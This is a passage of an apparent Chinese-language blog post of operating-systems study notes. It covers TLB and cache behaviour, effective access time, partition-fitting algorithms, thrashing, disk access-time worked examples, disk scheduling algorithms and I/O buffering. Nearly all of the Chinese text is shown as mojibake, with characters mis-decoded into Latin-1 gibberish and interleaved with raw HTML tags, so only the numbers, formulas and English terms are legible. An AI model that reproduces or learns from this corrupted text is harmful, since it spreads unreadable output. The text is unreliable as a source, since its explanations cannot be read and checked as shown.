ä¸ºåˆ†æ®µå¯ä»¥ä¸è¿ç»­ï¼Œå†è€…å†…éƒ¨è¢«åˆ†ä¸ºè‹¥å¹²ä¸ªé¡µï¼Œæ‰€ä»¥ä¸¤å—è¿›ç¨‹å æ®å†…å­˜ä¹‹é—´ä¸å­˜åœ¨å¤–éƒ¨ç¢ç‰‡ï¼Œä½†æ˜¯å› ä¸ºå†…å­˜ä»¥é¡µä¸ºå•ä½æ¥ä½¿ç”¨ï¼Œæœ€åä¸€é¡µå¾€å¾€è£…ä¸æ»¡ï¼Œäºæ˜¯å½¢æˆäº†å†…éƒ¨ç¢ç‰‡ã€‚</p><p>æ®µé¡µå¼ç©ºé—´æµªè´¹å°ã€‚</p><p>### <ahref="https://blog.csdn.net/will130/article/details/49684563">CPUä¸­çš„ç¼“å­˜å’Œæ“ä½œç³»ç»Ÿä¸­çš„ç¼“å­˜</a></p><p>å¼•å…¥</p><p>TLB( Translation Lookaside Buffer)è½¬æ¢æ£€æµ‹ç¼“å†²åŒºæ˜¯ä¸€ä¸ªå†…å­˜ç®¡ç†å•å…ƒ,ç”¨äºæ”¹è¿›è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢é€Ÿåº¦çš„ç¼“å­˜ï¼Œåˆç§°ä¸º<em>å¿«è¡¨</em>ã€‚</p><p><strong><em>å¿«è¡¨</em>â€”- Cache åœ¨ OS ä¸­çš„å…¸å‹èŒƒä¾‹</strong></p><p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œä¸ºæä¾›ç³»ç»Ÿçš„å­˜å–é€Ÿåº¦ï¼Œåœ¨åœ°å€æ˜ å°„æœºåˆ¶ä¸­å¢åŠ äº†ä¸€ä¸ªå°å®¹å™¨çš„è”æƒ³å¯„å­˜å™¨ï¼ˆç›¸è”å­˜å‚¨å™¨ï¼‰ï¼Œå³å¿«è¡¨ã€‚ç”¨æ¥å­˜æ”¾å½“å‰è®¿é—®æœ€é¢‘ç¹çš„å°‘æ•°æ´»åŠ¨é¡µé¢çš„é¡µå·ã€‚</p><p>å½“ç”¨æˆ·éœ€è¦å­˜ /å–æ•°æ®æ—¶ï¼Œæ ¹æ®æ•°æ®æ‰€åœ¨çš„<strong>é€»è¾‘é¡µå·</strong>åœ¨å¿«è¡¨ä¸­æ‰¾åˆ°å…¶å¯¹åº”çš„å†…å­˜å—å·ï¼Œå†è”ç³»é¡µå†…åœ°å€ï¼Œå½¢æˆç‰©ç†åœ°å€ã€‚</p><p>å¦‚æœåœ¨å¿«è¡¨ä¸­æ²¡æœ‰ç›¸åº”çš„é€»è¾‘é¡µå·ï¼Œåˆ™åœ°å€æ˜ å°„ä»å¯ä»¥é€šè¿‡å†…å­˜ä¸­çš„é¡µè¡¨è¿›è¡Œï¼Œå¾—åˆ°å¯¹åº”/ç©ºé—²å—å·åå¿…é¡»å°†è¯¥å—å·å¡«å…¥å¿«è¡¨çš„ç©ºé—²å—ä¸­ã€‚å¦‚æœå¿«è¡¨ä¸­æ²¡æœ‰ç©ºé—²å—ï¼Œåˆ™æ ¹æ®æ·˜æ±°ç®—æ³•æ·˜æ±°æŸä¸€è¡Œï¼Œå†å¡«å…¥æ–°çš„é¡µå·å’Œå—å·ã€‚</p><p>å¿«è¡¨æŸ¥æ‰¾å†…å­˜å—çš„ç‰©ç†åœ°å€æ¶ˆè€—çš„æ—¶é—´å¤§å¤§é™ä½äº†ï¼Œä½¿å¾—ç³»ç»Ÿæ•ˆç‡å¾—åˆ°äº†æå¤§çš„æé«˜ã€‚</p><p><strong><em>é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨(Cache)</em> â€”- Cache åœ¨ CPUä¸­è¿ç”¨çš„å…¸å‹èŒƒä¾‹</strong></p><p>é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨ï¼ˆCacheï¼‰æ˜¯ä½äº CPUä¸å†…å­˜ä¹‹é—´çš„ä¸´æ—¶å­˜å‚¨å™¨ï¼Œå®ƒçš„å®¹é‡æ¯”å†…å­˜å°ä½†äº¤æ¢é€Ÿåº¦å¿«ã€‚åœ¨ Cacheä¸­çš„æ•°æ®æ˜¯å†…å­˜ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œä½†è¿™ä¸€å°éƒ¨åˆ†æ˜¯æ®µæ—¶é—´å†… CPU å³å°†è®¿é—®çš„ã€‚å½“CPU è°ƒç”¨å¤§é‡æ•°æ®æ—¶ï¼Œå°±å¯é¿å¼€å†…å­˜ç›´æ¥ä» Cacheä¸­è°ƒç”¨ï¼Œä»è€ŒåŠ å¿«è¯»å–é€Ÿåº¦ã€‚ç”±æ­¤å¯è§ï¼Œåœ¨ CPU åŠ å…¥ Cacheæ˜¯ä¸€ç§é«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆï¼Œè¿™æ ·æ•´ä¸ªå†…å­˜å‚¨å™¨ï¼ˆCache + å†…å­˜ï¼‰å°±å˜æˆäº†æ—¢æœ‰ Cacheçš„é«˜é€Ÿåº¦åˆæœ‰å†…å­˜çš„å¤§å®¹é‡çš„å­˜å‚¨ç³»ç»Ÿäº†ã€‚Cache å¯¹ CPUæ€§èƒ½çš„å½±å“å¾ˆå¤§ï¼Œè¿™ä¸»è¦æ˜¯ç”± CPU çš„æ•°æ®äº¤æ¢é¡ºåºå’Œ CPU ä¸ Cacheé—´çš„å¸¦å®½å¼•èµ·çš„ã€‚</p><p>cpu ç¼“å­˜æ˜¯é›†æˆäº cpuä¸­çš„åŒææ€§çš„é«˜é€Ÿå­˜å‚¨é˜µåˆ—ï¼ˆæ¯”å†…å­˜è¦å¿«å¾ˆå¤šï¼‰ï¼Œä½œç”¨æ˜¯ç”¨æ¥åŠ é€Ÿ cpuå¯¹é«˜é¢‘æ•°æ®çš„è®¿é—®æ¥æé«˜ç³»ç»Ÿæ€§èƒ½ã€‚</p></li><li><p>å†…å­˜è®¿é—®æ¬¡æ•° / æ—¶é—´</p></li><li><p>è™šæ‹Ÿé¡µå¼å­˜å‚¨ç³»ç»Ÿ</p><p>å¿«è¡¨æ˜¯ä¸€ç§ç‰¹æ®Šçš„é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨ï¼ˆCacheï¼‰ï¼Œå†…å®¹æ˜¯é¡µè¡¨ä¸­çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨å†…å®¹ã€‚Â [1]</p><p>åœ¨æ“ä½œç³»ç»Ÿä¸­å¼•å…¥å¿«è¡¨æ˜¯ä¸ºäº†åŠ å¿«åœ°å€æ˜ å°„é€Ÿåº¦ã€‚</p><p>åœ¨è™šæ‹Ÿé¡µå¼å­˜å‚¨ç®¡ç†ä¸­è®¾ç½®äº†å¿«è¡¨ï¼Œä½œä¸ºå½“å‰è¿›ç¨‹é¡µè¡¨çš„Cacheã€‚é€šå¸¸å¿«è¡¨å¤„äº MMU ä¸­ã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200728215555.png"alt="tlb" /><figcaption aria-hidden="true">tlb</figcaption></figure></li><li><p>æ®µé¡µå¼ç³»ç»Ÿ</p><p>åœ¨æ²¡æœ‰ç¼“å­˜æ®µè¡¨å’Œé¡µè¡¨çš„æƒ…å†µä¸‹ï¼Œä¸ºäº†<strong>è·å¾—ä¸€æ¡æŒ‡ä»¤æˆ–æ•°æ®ï¼Œé¡»ä¸‰æ¬¡è®¿é—®å†…å­˜</strong>ã€‚</p><p>1.Â ç¬¬ä¸€æ¬¡è®¿é—®æ˜¯<strong>è®¿é—®å†…å­˜ä¸­çš„æ®µè¡¨</strong>ï¼Œä»ä¸­å–å¾—é¡µè¡¨å§‹å€ï¼›</p><p>2.Â ç¬¬äºŒæ¬¡è®¿é—®æ˜¯<strong>è®¿é—®å†…å­˜ä¸­çš„é¡µè¡¨</strong>ï¼Œä»ä¸­å–å‡ºè¯¥é¡µæ‰€åœ¨çš„ç‰©ç†å—å·ï¼Œå¹¶å°†è¯¥å—å·ä¸é¡µå†…åœ°å€ä¸€èµ·å½¢æˆæŒ‡ä»¤æˆ–æ•°æ®çš„ç‰©ç†åœ°å€ï¼›</p><p>3.Â ç¬¬ä¸‰æ¬¡è®¿é—®æ‰æ˜¯çœŸæ­£ä»ç¬¬äºŒæ¬¡è®¿é—®æ‰€å¾—çš„åœ°å€ä¸­ï¼Œ<strong>å–å‡ºæŒ‡ä»¤æˆ–æ•°æ®</strong></p><p>å½“å·²ç»ç¼“å­˜äº†æ®µè¡¨æˆ–é¡µè¡¨æ—¶ï¼Œå‰ä¸¤æ¬¡è®¿å­˜è¿‡ç¨‹å¯ä»¥è·³è¿‡ï¼Œç›´æ¥ä»ç¼“å­˜å¯å–æ®µè¡¨æˆ–é¡µè¡¨ï¼Œæœ€åè¿›è¡Œç¬¬ä¸‰æ­¥ï¼šå»å†…å­˜å–æŒ‡ä»¤å’Œæ•°æ®ã€‚</p><p>æ‰€ä»¥è‡³å¤šä¸‰æ¬¡ï¼Œè‡³å°‘ä¸€æ¬¡ã€‚</p><p>ä¾‹é¢˜ï¼š</p></li><li><p>åˆ†é¡µå­˜å‚¨ç³»ç»Ÿå†…å­˜æœ‰æ•ˆè®¿é—®æ—¶é—´</p><p><ahref="https://blog.csdn.net/yangkuiwu/article/details/53996900">æœ‰æ•ˆè®¿é—®æ—¶é—´</a></p></li><li><p><ahref="https://wenku.baidu.com/view/601c5f0159fafab069dc5022aaea998fcc224023.html?re=view">æ“ä½œç³»ç»Ÿç¬¬5 ç« ä¹ é¢˜å¸¦ç­”æ¡ˆ</a></p><blockquote><p>åœ¨ä¸€ä¸ªå…·æœ‰å¿«è¡¨çš„è™šæ‹Ÿé¡µå¼å†…å­˜ç³»ç»Ÿä¸­ï¼Œå¿«è¡¨çš„å‘½ä¸­ç‡ä¸º95%ï¼ŒæŒ‡ä»¤å’Œæ•°æ®çš„ç¼“å­˜å‘½ä¸­ç‡ä¸º 75%ï¼›è®¿é—®å¿«è¡¨å’Œç¼“å­˜çš„æ—¶é—´ä¸º10nsï¼Œæ›´æ–°ä¸€æ¬¡å¿«è¡¨çš„æ—¶é—´ä¸º 10Î¼sï¼Œæ›´æ–°ä¸€ä¸ªç¼“å­˜å—çš„æ—¶é—´ä¸º20Î¼sã€‚è¯·è®¡ç®—ï¼Œæ¯æ¡æŒ‡ä»¤çš„æœ‰æ•ˆè®¿é—®æ—¶é—´æ˜¯å¤šå°‘ï¼Ÿ</p></blockquote><p>åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼šæŸ¥æ‰¾é¡µè¡¨ å’Œ æŸ¥æ‰¾æ•°æ®å’ŒæŒ‡ä»¤</p><p>ç¬¬ä¸€æ­¥ï¼šæŸ¥æ‰¾é¡µè¡¨</p><p>å¦‚æœå¿«è¡¨å‘½ä¸­ï¼š10ns</p><p>å¦‚æœå¿«è¡¨æœªå‘½ä¸­ï¼š10ns + 10 us</p><p>ç¬¬äºŒæ­¥ï¼šæŸ¥æ‰¾æŒ‡ä»¤å’Œæ•°æ®</p><p>å¦‚æœæŒ‡ä»¤å’Œæ•°æ®çš„ç¼“å­˜å‘½ä¸­ï¼š10 ns</p><p>å¦‚æœæŒ‡ä»¤å’Œæ•°æ®çš„ç¼“å­˜æœªå‘½ä¸­ï¼š10ns + 20 us</p><p>ç»¼ä¸Šï¼š</p><p><code>95%*10 ns + 5%(10ns + 10 us) + 75%*10ns + 25%( 10ns + 20 us )</code></p><p>ç§’æ¢ç®—</p><p>1 ç§’(s) ï¼ 1000 æ¯«ç§’(ms)</p><p>1 æ¯«ç§’(ms)ï¼ 1000 å¾®ç§’ (us)</p><p>1 å¾®ç§’(us)ï¼ 1000 çº³ç§’ (ns)</p><p>1 çº³ç§’(ns)ï¼ 1000 çš®ç§’ (ps)</p></li></ol></li></ol><h4 id="åŠ¨æ€åˆ†åŒº">åŠ¨æ€åˆ†åŒº</h4><ol type="1"><li><p>é¦–æ¬¡é€‚é…</p><p>é¦–æ¬¡é€‚é…ç®—æ³•ä¸ä»…æ˜¯æœ€ç®€å•çš„ï¼Œè€Œä¸”é€šå¸¸ä¹Ÿæ˜¯æœ€å¿«å’Œæœ€å¥½çš„ã€‚</p></li><li><p>å¾ªç¯é€‚é… / ä¸‹æ¬¡é€‚é…</p></li><li><p>æœ€ä½³é€‚é…</p><p>æœ€ä½³é€‚é…é€šå¸¸æ€§èƒ½æ˜¯æœ€å·®çš„ï¼Œä¸å…¶ä»–ç®—æ³•ç›¸æ¯”ï¼Œå®ƒéœ€è¦æ›´é¢‘ç¹åœ°è¿›è¡Œå†…å­˜å‹ç¼©ã€‚</p></li><li><p>æœ€å·®é€‚é…</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä»å¥½åˆ°åï¼šé¦–æ¬¡é€‚é… â‰¥ å¾ªç¯é€‚é… â‰¥ æœ€ä½³é€‚é…ã€‚</p><p>å¯¹å†…å­˜çš„åˆ©ç”¨ç‡ä»é«˜åˆ°ä½ï¼šåŒä¸Šã€‚</p><p>ä¼˜ç¼ºç‚¹è§è¯¾æœ¬ p210</p></li></ol><h4 id="é©»ç•™é›†">é©»ç•™é›†</h4><p>å¯¹äºåˆ†é¡µå¼è™šæ‹Ÿå†…å­˜ï¼Œåœ¨å‡†å¤‡æ‰§è¡Œæ—¶ï¼Œæ“ä½œç³»ç»Ÿå†³å®šè¯»å–çš„è¯¥è¿›ç¨‹çš„é¡µæ•°ï¼Œå³ï¼šå†³å®šç»™ç‰¹å®šçš„è¿›ç¨‹åˆ†é…çš„ç©ºé—´å¤§å°ï¼ˆåˆ†é…çš„é¡µæ¡†ä¸ªæ•°ï¼‰ã€‚ä¾‹å¦‚ï¼šé©»ç•™é›†å¤§å°ä¸º2ï¼Œ åˆ™ä¸ºè¯¥è¿›ç¨‹åˆ†é… 2 ä¸ªé¡µæ¡†ã€‚</p><ol type="1"><li><p>åœ¨è¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†ä¸­ï¼Œä»ä¸»å­˜åˆšåˆšç§»èµ°æŸä¸€é¡µé¢åï¼Œæ ¹æ®è¯·æ±‚åˆé©¬ä¸Šè°ƒå…¥è¯¥é¡µï¼Œè¿™ç§åå¤è°ƒè¿›è°ƒå‡ºçš„ç°è±¡ï¼Œç§°ä¸ºç³»ç»Ÿé¢ ç°¸ï¼Œä¹Ÿå«ç³»ç»ŸæŠ–åŠ¨ã€‚</p></li><li><p>å¯èƒ½å‡ºç° "æŠ–åŠ¨"çš„å­˜å‚¨ç®¡ç†æ–¹å¼ï¼šè¯·æ±‚åˆ†é¡µå­˜å‚¨ç®¡ç†ã€è¯·æ±‚æ®µå¼å­˜å‚¨ç®¡ç†ã€è¯·æ±‚æ®µé¡µå¼å­˜å‚¨ç®¡ç†ã€‚</p><p>å¯èƒ½å‡ºç°æŠ–åŠ¨çš„ï¼Œå°±æ˜¯å­˜åœ¨é¡µé¢æ¢å…¥æ¢å‡ºçš„ï¼Œé‚£å½“ç„¶å°±æ˜¯è™šæ‹Ÿå†…å­˜ä¸­çš„è¯·æ±‚xxx å­˜å‚¨ç®¡ç†äº†ã€‚</p></li></ol><h2 id="è®¾å¤‡ç®¡ç†">è®¾å¤‡ç®¡ç†</h2><p>è®¾å¤‡ç‹¬ç«‹æ€§ï¼Œå³åº”ç”¨ç¨‹åºç‹¬ç«‹äºå…·ä½“ä½¿ç”¨çš„ç‰©ç†è®¾å¤‡ã€‚</p><p>ä¸ºäº†å®ç°è®¾å¤‡ç‹¬ç«‹æ€§è€Œå¼•å…¥äº†é€»è¾‘è®¾å¤‡å’Œç‰©ç†è®¾å¤‡è¿™ä¸¤ä¸ªæ¦‚å¿µã€‚</p><h2 id="ç£ç›˜">ç£ç›˜</h2><h3 id="æœ¯è¯­">æœ¯è¯­</h3><p>ç›˜ç‰‡è¢«åˆ†æˆè®¸å¤šæ‰‡å½¢çš„åŒºåŸŸ,æ¯ä¸ªåŒºåŸŸå«ä¸€ä¸ªæ‰‡åŒºã€‚</p><p>ç›˜ç‰‡è¡¨é¢ä¸Šä»¥ç›˜ç‰‡ä¸­å¿ƒä¸ºåœ†å¿ƒ,ä¸åŒåŠå¾„çš„åŒå¿ƒåœ†ç§°ä¸ºç£é“ã€‚</p><p>ç¡¬ç›˜ä¸­,ä¸åŒç›˜ç‰‡ç›¸åŒåŠå¾„çš„ç£é“æ‰€ç»„æˆçš„åœ†æŸ±ç§°ä¸ºæŸ±é¢ã€‚</p><p>ç£é“ä¸æŸ±é¢éƒ½æ˜¯è¡¨ç¤ºä¸åŒåŠå¾„çš„åœ†,ç£ç›˜çš„æŸ±é¢æ•°ä¸ä¸€ä¸ªç›˜é¢ä¸Šçš„ç£é“æ•°æ˜¯ç›¸ç­‰çš„ï¼Œåœ¨è®¸å¤šåœºåˆ,ç£é“å’ŒæŸ±é¢å¯ä»¥äº’æ¢ä½¿ç”¨ã€‚</p><p>æ¯ä¸ªç£ç›˜æœ‰ä¸¤ä¸ªé¢,æ¯ä¸ªé¢éƒ½æœ‰ä¸€ä¸ªç£å¤´,ä¹ æƒ¯ç”¨ç£å¤´å·æ¥åŒºåˆ†ï¼Œç›˜é¢æ•°ç­‰äºæ€»çš„ç£å¤´æ•°ã€‚æ‰‡åŒº,ç£é“(æˆ–æŸ±é¢)å’Œç£å¤´æ•°æ„æˆäº†ç¡¬ç›˜ç»“æ„çš„åŸºæœ¬å‚æ•°ã€‚</p><p>è¿™äº›å‚æ•°å¯ä»¥å¾—åˆ°ç¡¬ç›˜çš„å®¹é‡,è®¡ç®—å…¬å¼ä¸º:å­˜å‚¨å®¹é‡=ç£å¤´æ•° Ã— ç£é“(æŸ±é¢)æ•°Ã— æ¯é“æ‰‡åŒºæ•° Ã— æ¯æ‰‡åŒºå­—èŠ‚æ•°</p><h3 id="å¹³å‡ç£ç›˜è®¿é—®æ—¶é—´">å¹³å‡ç£ç›˜è®¿é—®æ—¶é—´</h3><p>å­˜å–æ—¶é—´ = å¯»é“æ—¶é—´ + æ—‹è½¬å»¶æ—¶</p><p>å¹³å‡ç£ç›˜è®¿é—®æ—¶é—´ = å¹³å‡å¯»é“æ—¶é—´ + å¹³å‡æ—‹è½¬å»¶æ—¶ + ä¼ è¾“æ—¶é—´ +æ§åˆ¶å™¨å»¶æ—¶</p><p>å¹³å‡æ—‹è½¬å»¶æ—¶ = æ—‹è½¬ä¸€å‘¨æ—¶é—´çš„ä¸€åŠ( å¹³å‡å˜›ï¼Œå°±æ˜¯ * 1/2)</p><p>æ—‹è½¬å»¶è¿Ÿä¸­ï¼Œæœ€å¤šæ—‹è½¬ï¼‘åœˆï¼Œæœ€å°‘ä¸ç”¨æ—‹è½¬ï¼Œå¹³å‡æƒ…å†µä¸‹ï¼Œéœ€è¦æ—‹è½¬åŠåœˆï¼Œæ‰€ä»¥è¦é™¤2ï¼Œé—®é¢˜å°±è§£å†³äº†ã€‚</p><p>å¦‚æœæ²¡æœ‰è¯´ç£ç›˜ä¼ è¾“é€Ÿåº¦ï¼Œè¯´äº†æ¯ä¸ªç£é“çš„æ‰‡åŒºä¸ªæ•°ï¼Œå¯ä»¥ç”¨ å‘¨æœŸ/æ¯ä¸ªç£é“çš„æ‰‡åŒºä¸ªæ•° æ¥ä»£æ›¿ä¸€ä¸ªæ‰‡åŒºçš„ä¼ è¾“æ—¶é—´ã€‚</p><p>ä¾‹é¢˜ä¸€ï¼š</p><blockquote><p>æŸç£ç›˜çš„è½¬é€Ÿä¸º 10 000 è½¬/åˆ†ï¼Œå¹³å‡å¯»é“æ—¶é—´æ˜¯ 6 msï¼Œç£ç›˜ä¼ è¾“é€Ÿç‡æ˜¯ 20MB/sï¼Œ ç£ç›˜æ§åˆ¶å™¨å»¶è¿Ÿä¸º 0.2 msï¼Œè¯»å–ä¸€ä¸ª 4 KB çš„æ‰‡åŒºæ‰€éœ€çš„å¹³å‡æ—¶é—´çº¦ï¼ˆï¼‰ã€‚</p></blockquote><p>è§£æï¼š</p><blockquote><p>æ ¹æ®å…¬å¼ï¼šå¹³å‡ç£ç›˜è®¿é—®æ—¶é—´ = å¹³å‡å¯»é“æ—¶é—´ + å¹³å‡æ—‹è½¬å»¶æ—¶ + ä¼ è¾“æ—¶é—´ +æ§åˆ¶å™¨å»¶æ—¶ å¹³å‡å¯»é“æ—¶é—´ï¼š6ms å¹³å‡æ—‹è½¬å»¶è¿Ÿï¼š3ms 10000 è½¬/åˆ† =&gt;1min/10000 è½¬ = 6ms/è½¬ =&gt; 3ms/è½¬ ä¼ è¾“æ—¶é—´ï¼š0.2ms<code>4KB/20MB/s = ï¼ˆ0.2 * 2^(-10)ï¼‰çº¦= ï¼ˆ0.2 * 10^(-3)ï¼‰= 0.2ms</code>æ§åˆ¶å™¨å»¶è¿Ÿï¼š0.2ms æ•…è¯»å–ä¸€ä¸ª 4KB çš„æ‰‡åŒºæ‰€éœ€æ—¶é—´ä¸ºï¼š6ms+3ms+0.2ms+0.2ms =9.4ms</p></blockquote><p>ä¾‹é¢˜äºŒï¼š</p><blockquote><p>è‹¥ç£ç›˜è½¬é€Ÿä¸º 7200 è½¬/åˆ†ï¼Œå¹³å‡å¯»é“æ—¶é—´ä¸º 8ms,æ¯ä¸ªç£é“åŒ…å« 1000ä¸ªæ‰‡åŒºï¼Œåˆ™è®¿é—®ä¸€ä¸ªæ‰‡åŒºçš„å¹³å‡å»¶è¿Ÿæ—¶é—´å¤§çº¦æ˜¯ï¼ˆï¼‰ã€‚</p></blockquote><p>è§£æï¼š</p><blockquote><p>å­˜å–æ—¶é—´ = å¯»é“æ—¶é—´ + å»¶è¿Ÿæ—¶é—´ +ä¼ è¾“æ—¶é—´ã€‚å­˜å–ä¸€ä¸ªæ‰‡åŒºçš„å¹³å‡å»¶è¿Ÿæ—¶é—´ä¸ºæ—‹è½¬åŠå‘¨çš„æ—¶é—´ï¼Œå³ä¸º(60/7200)/2=4.17ms ï¼Œä¼ è¾“æ—¶é—´ä¸º (60/7200)/1000=0.01msï¼Œå› æ­¤è®¿é—®ä¸€ä¸ªæ‰‡åŒºçš„å¹³å‡å­˜å–æ—¶é—´ä¸º 4.17+0.01+8=12.18msï¼Œä¿ç•™ä¸€ä½å°æ•°åˆ™ä¸º 12.2ms ã€‚</p></blockquote><p>ä¾‹é¢˜ä¸‰ï¼š</p><blockquote><p>æŸç£ç›˜æ¯æ¡ç£é“å¯å­˜å‚¨ 10MB æ•°æ®ï¼Œè½¬é€Ÿä¸º 7200 rpmï¼Œ åˆ™è¯»å– 3MBæ•°æ®çš„ä¼ è¾“æ—¶é—´ä¸º 2.5 msã€‚</p></blockquote><p>è§£æï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; In [<span class="number">17</span>]: ï¼ˆ3MB/10MBï¼‰ * <span class="number">60</span>/<span class="number">7200</span></span><br><span class="line">&gt; Out[<span class="number">17</span>]: <span class="number">0.0025</span></span><br></pre></td></tr></table></figure><h4 id="ç£ç›˜åˆ†é…ç®—æ³•">ç£ç›˜åˆ†é…ç®—æ³•</h4><p>æ ¹æ®ç£ç›˜çš„æ“ä½œæ—¶é—´ï¼Œå¯¹ç£ç›˜è°ƒåº¦åˆ†ä¸ºï¼šç§»è‡‚è°ƒåº¦ã€æ—‹è½¬è°ƒåº¦ä¸¤éƒ¨åˆ†ç»„æˆã€‚</p><ol type="1"><li><p>ç§»è‡‚è°ƒåº¦ç®—æ³•</p><ul><li><p>å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFIFO / FCFSï¼‰</p></li><li><p>æœ€çŸ­å¯»æ‰¾æ—¶é—´ä¼˜å…ˆ/ æœ€çŸ­æœåŠ¡æ—¶é—´ä¼˜å…ˆï¼ˆSSTFï¼‰</p><p>é€‰æ‹©ä½¿ç£å¤´è‡‚ä»å½“å‰ä½ç½®å¼€å§‹ç§»åŠ¨æœ€å°‘çš„ IO è¯·æ±‚ã€‚</p></li><li><p>ç”µæ¢¯è°ƒåº¦ç®—æ³•ï¼ˆSCAN ç®—æ³•ï¼‰</p><p>ä»ç§»åŠ¨è‡‚å½“å‰ä½ç½®å¼€å§‹æ²¿ç€è‡‚çš„ç§»åŠ¨æ–¹å‘å»é€‰æ‹©ç¦»å½“å‰ç§»åŠ¨è‡‚æœ€è¿‘çš„é‚£ä¸ªæŸ±é¢çš„è®¿é—®è€…ï¼Œå¦‚æœæ²¿è‡‚çš„ç§»åŠ¨æ–¹å‘æ— è¯·æ±‚è®¿é—®æ—¶ï¼Œå°±æ”¹å˜è‡‚çš„ç§»åŠ¨æ–¹å‘ï¼ˆæ‰å¤´ï¼‰å†é€‰æ‹©ã€‚</p></li><li><p>å•å‘æ‰«æç®—æ³•ï¼ˆCSCANï¼Œå¾ªç¯ SCANï¼‰</p><p>å½“è®¿é—®åˆ°æ²¿æŸä¸ªæ–¹å‘çš„æœ€åä¸€ä¸ªç£é“æ—¶ï¼Œç£å¤´è‡‚è¿”å›åˆ°ç£ç›˜ç›¸åæ–¹å‘æœ«ç«¯çš„ç£é“ï¼Œå¹¶å†æ¬¡å¼€å§‹æ‰«æã€‚</p><p>SCAN ç®—æ³• ä¸ CSCAN ç®—æ³•</p><p>ç›¸åŒç‚¹ï¼šæœ€å¼€å§‹éƒ½æ˜¯ä»å½“å‰ä½ç½®ï¼Œå‘ç§»åŠ¨æ–¹å‘èµ°ã€‚</p><p>ä¸åŒç‚¹ï¼šåˆ°äº†æŸä¸ªæ–¹å‘çš„æœ€åä¸€ä¸ªè¦è®¿é—®çš„ç£é“ä¹‹åï¼Œå‰è€…åœ¨å½“å‰ä½ç½®æ‰å¤´å¾€åèµ°ï¼Œåè€…ï¼Œå»åˆ°åæ–¹å‘çš„æœ«ç«¯ï¼Œå†å¼€å§‹è¯¥æ–¹å‘æ‰«æã€‚</p><p>å½“ç§»åŠ¨è‡‚å®šä½åï¼Œåº”è¯¥ä¼˜å…ˆé€‰æ‹©å»¶è¿Ÿæ—¶é—´æœ€çŸ­çš„è®¿é—®è€…å»æ‰§è¡Œï¼Œæ ¹æ®å»¶è¿Ÿæ—¶é—´æ¥å†³å®šæ‰§è¡Œæ¬¡åºçš„è°ƒåº¦ç§°ä¸ºæ—‹è½¬è°ƒåº¦ã€‚</p></li></ul></li></ol><h3 id="io-ç¼“å†²">IO ç¼“å†²</h3><h3 id="io-ç¼“å†²æ–¹å¼">I/O ç¼“å†²æ–¹å¼</h3><ol type="1"><li><p>å•ç¼“å†²</p></li><li><p>åŒç¼“å†²</p></li><li><p>å¾ªç¯ç¼“å†²</p><blockquote><p>å‡è®¾ä¸€ä¸ªè®¡ç®—è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸä¸º 1 å°æ—¶ï¼ŒI/O è®¾å¤‡å†™ä¸€ä¸ªç¼“å†²åŒºéœ€è¦10Sï¼Œè®¡ç®—è¿›ç¨‹æ¯éš” 6Sè¯»ä¸€ä¸ªç¼“å†²åŒºï¼ˆè¯»ç¼“å†²çš„æ—¶é—´å¿½ç•¥ä¸è®¡ï¼‰ã€‚å¦‚æœé‡‡å–é¢„å…ˆå†™ç¼“å†²çš„æ–¹å¼ï¼Œç¼“å†²åŒºç®¡ç†é‡‡å–å¾ªç¯ç¼“å†²ï¼Œè¦æ±‚è®¡ç®—è¿›ç¨‹ä¸èƒ½å› ä¸ºè¯»ç¼“å†²åŒºè€Œè¢«é˜»å¡ï¼Œé‚£ä¹ˆå¾ªç¯ç¼“å†²ä¸­è‡³å°‘åº”è¯¥æœ‰å¤šå°‘ä¸ªç¼“å†²åŒºï¼Ÿ</p></blockquote><p>è§£æ</p><blockquote><p>ç”±äºè¦æ±‚è¿›ç¨‹ï¼ˆåœ¨ç”Ÿå‘½å‘¨æœŸå†…ï¼‰ä¸èƒ½å› è¯»ç¼“å†²åŒºè¢«é˜»å¡ã€‚å› æ­¤ï¼Œåœ¨ 1å°æ—¶å†…ï¼Œå­˜åœ¨ä¸‹åˆ—æ¡ä»¶ï¼šè¯»çš„ç¼“å†²åŒºä¸ªæ•° â‰¤å†™çš„ç¼“å†²åŒºä¸ªæ•°ï¼ˆå½“ç„¶ï¼Œè¦åŒ…æ‹¬é¢„å…ˆå†™çš„ç¼“å†²ï¼‰ã€‚</p></blockquote><p>è®¡ç®—å¦‚ä¸‹ï¼š</p><blockquote><p>é¢„å¤‡ï¼š1 h =3600 sï¼Œå¯ä»¥å†™ ï¼š 3600 / 10 = 360 ä¸ªç¼“å†²åŒºã€‚å¯ä»¥è¯» 3600/6= 600 ä¸ªç¼“å†²åŒºã€‚åˆå› ä¸ºé¢„ç¼“å†²ï¼Œæ‰€ä»¥ä¸€å¼€å§‹ç¼“å†²åŒºéƒ½æ˜¯æ»¡çš„ã€‚ æ•…ï¼š600 â‰¤ 360 +n, æ‰€ä»¥ï¼šè‡³å°‘åº”æœ‰ 240 ä¸ªç¼“å†²åŒºã€‚</p></blockquote></li><li><p>ç¼“å†²æ± </p></li><li><p>SPOOLing æŠ€æœ¯</p><p>ç›®çš„ï¼šå°†ä¸€å°ç‰©ç† Iï¼O è®¾å¤‡è™šæ‹Ÿä¸ºå¤šå°é€»è¾‘ Iï¼Oè®¾å¤‡ï¼ŒåŒæ ·å…è®¸å¤šä¸ªç”¨æˆ·å…±äº«ä¸€å°ç‰©ç† Iï¼O è®¾å¤‡ã€‚</p><p>åœ¨è”æœºæƒ…å†µä¸‹å®ç°çš„åŒæ—¶å¤–å›´æ“ä½œç§°ä¸º SPOOLineï¼Œ SPOOling æŠ€æœ¯</p><p>ç‰¹ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰æé«˜äº† Iï¼O 